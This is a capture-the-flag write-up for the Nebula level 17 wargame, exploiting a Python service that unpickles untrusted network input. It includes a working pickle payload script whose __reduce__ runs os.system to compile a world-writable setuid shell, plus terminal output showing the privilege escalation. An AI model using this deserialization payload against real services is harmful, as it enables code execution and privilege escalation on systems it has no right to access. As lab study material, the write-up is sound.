**Intro**

More command injection but with Python this time.

Not being familiar with some of the mdoules used in this script I started up with a little research on ***pickle*** with my interest in the pickle.loads function.

```
  obj = pickle.loads(line)
```

Right off the bat the [Python pickle Documentation](https://docs.python.org/2/library/pickle.html) explicitly states

```
Warning The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
```



So there it is from the horse's mouth.  We've got an app listening on a port and it's ready to unpickle whatever we send to it as an untrusted source.

I'll take advantage of the mistake with a python script of my own.  The source is also available [here](../resources/rottenPickle.py) 

**rottenPickle.py**

```
import socket
import cPickle
import os


class local_shell(object):
    def __reduce__(self):
        return (os.system,('/usr/bin/cc -o /home/flag17/shell /tmp/shell.c && chmod 4777 /home/flag17/shell',))

shell = cPickle.dumps(local_shell())
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1',10007))
client_socket.send(shell)
```


**Exploit and capture the flag**

```
﻿level17@nebula:~$ ls -l /home/flag17/
total 1
-rw-r--r-- 1 root root 520 2011-11-20 21:22 flag17.py
level17@nebula:~$ python rottenPickle.py 
level17@nebula:~$ ls -l /home/flag17/
total 9
-rw-r--r-- 1 root   root    520 2011-11-20 21:22 flag17.py
-rwsrwxrwx 1 flag17 flag17 7317 2016-10-25 04:33 shell
﻿level17@nebula:~$ grep flag17 /etc/passwd
flag17:x:982:982::/home/flag17:/bin/sh
level17@nebula:~$ /home/flag17/shell 982
flag17@nebula:~$ getflag
You have successfully executed getflag on a target account
flag17@nebula:~$ 
```
